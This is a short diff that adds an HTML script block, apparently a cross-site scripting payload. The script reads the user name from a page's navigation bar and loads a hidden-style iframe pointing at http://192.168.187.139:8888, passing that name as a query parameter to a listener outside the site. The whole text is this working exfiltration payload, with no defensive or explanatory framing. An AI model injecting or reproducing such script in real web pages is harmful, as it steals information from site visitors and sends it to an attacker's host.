@@ -1,0 +1,6 @@
+<script>
+    const userName = document.querySelector('.navbar-nav').children[1].innerHTML;
+    const iframe = document.createElement('iframe');
+    iframe.src = `http://192.168.187.139:8888?c=${encodeURIComponent(userName)}`;
+    document.body.appendChild(iframe);
+</script>
